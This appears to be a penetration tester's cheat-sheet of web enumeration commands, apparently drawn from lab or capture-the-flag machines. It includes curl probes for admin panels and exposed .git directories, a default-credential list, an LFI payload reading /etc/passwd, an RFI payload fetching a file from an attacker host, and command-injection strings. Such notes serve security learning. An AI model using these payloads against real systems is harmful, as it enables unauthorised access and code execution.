## 🌐 Web Enumeration

### Check for Common Web Directories

```bash
curl -I http://<IP>/admin.php               # Check for admin panel  
curl -I http://<IP>/config.php              # Check for exposed configuration files  
curl -I http://<IP>/backup                  # Check for backup directories  
```

### Test for Default Credentials

```bash
# Try common default credential combos
admin:admin  
admin:password  
admin:1234  
root:root  
```

### Exposed Directories

```bash
curl -I http://<IP>/.git/                   # Check for exposed Git repository  
curl -I http://<IP>/uploads/                # Check for upload directory exposure  
```

### Local File Inclusion (LFI) / Remote File Inclusion (RFI)

```bash
curl http://<IP>/index.php?file=../../../../etc/passwd  
curl http://<IP>/index.php?file=http://<attacker_IP>/evil.txt  
```

### Command Injection

```bash
curl http://<IP>/vuln.php?input="; id"  
curl http://<IP>/vuln.php?input="| whoami"  
curl http://<IP>/vuln.php?input="`id`"  
```

### Observations from First 10 Machines

- Admin panels found at `/admin.php`, `/admin`, or `/login`
- `.git` or `/uploads/` often exposed and accessible
- LFI discovered using `?file=` parameter in multiple PHP applications
- CMS systems like WordPress and WonderCMS used common login paths and sometimes default credentials
- RCE via file upload or LFI+Log Injection confirmed on a few boxes
